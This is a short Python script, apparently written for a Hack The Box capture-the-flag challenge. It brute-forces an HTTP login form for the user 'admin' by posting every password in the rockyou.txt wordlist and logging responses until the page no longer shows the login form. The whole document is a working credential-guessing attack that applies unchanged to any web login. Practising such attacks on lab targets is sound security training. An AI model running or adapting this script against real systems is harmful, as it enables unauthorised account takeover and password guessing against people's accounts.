#!/usr/bin/python3
import requests

server = "http://docker.hackthebox.eu:50386/"
error_string = "loginform"

logfile = open("logfile.txt","w")
user = "admin"

with open("../common-resources/rockyou.txt","r") as f:
    for line in f:
        passwd = line.rstrip()
        payload = {'username':user, 'password': passwd}
        r = requests.post(server, data=payload)

        logfile.write(str(r.status_code))

        if(error_string not in r.text):
            logfile.write(r.text)
            logfile.write("------ Password found -------: " + passwd)
            break;

logfile.close()
